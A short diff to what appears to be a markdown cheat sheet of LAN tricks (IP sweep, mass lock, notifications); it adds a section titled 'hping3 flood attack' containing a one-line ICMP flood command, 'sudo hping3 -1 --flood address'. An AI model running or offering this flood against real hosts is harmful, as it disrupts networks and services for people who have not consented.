@@ -3,6 +3,7 @@
 - [IP sweep](#ip-sweep)
 - [Mass Lock](#mass-lock)
 - [Notification Message](#Send-notification-message)
+- [hping3 flood](#hping3-flood-attack)
 
 ## IP Sweep
 ```
@@ -43,4 +44,10 @@ done
 ## Send notification message
 ```
 notify-send -H <receiving_computer_ip_address> "Your Message Here"
+```
+
+## hping3 flood attack
+
+```
+sudo hping3 -1 --flood address
 ```
